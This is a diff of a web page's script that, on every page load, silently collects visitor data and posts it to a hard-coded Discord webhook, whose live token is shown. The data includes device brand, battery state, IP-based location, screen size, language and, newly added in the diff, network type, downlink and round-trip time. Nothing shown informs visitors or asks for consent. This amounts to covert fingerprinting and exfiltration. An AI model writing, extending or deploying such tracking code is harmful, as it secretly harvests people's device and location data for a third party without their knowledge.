@@ -192,7 +192,6 @@ textarea{resize:none; height:80px}
 
 
 
-
 <script>
 // 6️⃣ Battery Info Detector
 async function getBatteryInfo() {
@@ -212,7 +211,7 @@ async function getBatteryInfo() {
     }
 }
 
-// Example functions to get visitor info
+// Device brand
 function getDeviceBrand() {
     const ua = navigator.userAgent;
     if(/iPhone/i.test(ua)) return "Apple iPhone";
@@ -223,10 +222,7 @@ function getDeviceBrand() {
     return "Unknown";
 }
 
-function getNetworkProvider() {
-    return "N/A"; // Browser can't reliably get network provider
-}
-
+// Visitor ID
 function getVisitorID() {
     let id = sessionStorage.getItem("visitorID");
     if(!id){
@@ -236,12 +232,26 @@ function getVisitorID() {
     return id;
 }
 
-// Send Visitor Info to Discord
+// Network info
+function getNetworkInfo() {
+    if(navigator.connection){
+        return {
+            effectiveType: navigator.connection.effectiveType || "N/A",
+            downlink: navigator.connection.downlink || "N/A",
+            rtt: navigator.connection.rtt || "N/A"
+        };
+    } else {
+        return { effectiveType: "N/A", downlink: "N/A", rtt: "N/A" };
+    }
+}
+
+// Send Visitor Info
 async function sendVisitorInfo() {
     const webhookURL = "https://discord.com/api/webhooks/1449603518691283157/AiLtL8RdJoHumPvm0j7FycuT28N5cutaKSW3gs29GThGc6sDQsp4bF1IkdbiWhiQp41n";
     const deviceBrand = getDeviceBrand();
     const visitorID = getVisitorID();
     const battery = await getBatteryInfo();
+    const network = getNetworkInfo();
 
     // IP based location
     let locationText = "Not Available";
@@ -269,6 +279,9 @@ async function sendVisitorInfo() {
                 { name: "⏱️ Charging Time", value: battery.chargingTime, inline: true },
                 { name: "⏱️ Discharging Time", value: battery.dischargingTime, inline: true },
                 { name: "🌍 Location", value: locationText, inline: false },
+                { name: "📶 Network Type", value: network.effectiveType, inline: true },
+                { name: "📶 Downlink", value: network.downlink + " Mbps", inline: true },
+                { name: "📶 RTT", value: network.rtt + " ms", inline: true },
                 { name: "📐 Screen Resolution", value: screen.width + "x" + screen.height, inline: true },
                 { name: "🖥️ Viewport Size", value: window.innerWidth + "x" + window.innerHeight, inline: true },
                 { name: "🌐 Browser Language", value: navigator.language, inline: true },
@@ -301,12 +314,6 @@ async function sendVisitorInfo() {
 if(!sessionStorage.getItem("sessionStart")) sessionStorage.setItem("sessionStart", Date.now());
 sendVisitorInfo();
 </script>
-
-
-
-
-
-
 
 
 
